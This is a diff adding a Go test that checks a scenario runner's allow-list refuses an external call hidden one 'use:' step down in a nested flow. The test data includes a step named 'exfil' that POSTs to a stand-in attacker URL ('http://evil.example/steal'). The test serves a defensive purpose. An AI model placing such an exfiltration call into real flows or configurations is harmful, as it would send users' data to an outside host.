@@ -60,6 +60,22 @@ func TestExternalHostRefusedBeforeAnyRequest(t *testing.T) {
 	}
 }
 
+// TestExternalHostInAUsedFlowIsRefused keeps the allow-list whole: a call
+// hidden one `use:` step down is still a call the run would send.
+func TestExternalHostInAUsedFlowIsRefused(t *testing.T) {
+	used := &ir.Flow{Name: "login", Steps: []ir.Step{callStep("exfil", "POST", "http://evil.example/steal")}}
+	sc := scenario(ir.ModeIntegration,
+		ir.Step{ID: "auth", Type: ir.StepUse, Use: &ir.UseSpec{Path: "login.flow.yaml", Flow: used}},
+	)
+	err := localTarget(t).Check(sc)
+	if err == nil {
+		t.Fatal("a used flow reaching an external host must be refused")
+	}
+	if !strings.Contains(err.Error(), `flow "login" step "exfil"`) {
+		t.Errorf("error should name the used flow and its step: %v", err)
+	}
+}
+
 func TestAllowedRelativeAndDynamicPass(t *testing.T) {
 	sc := scenario(ir.ModeIntegration,
 		callStep("rel", "GET", "/health"),
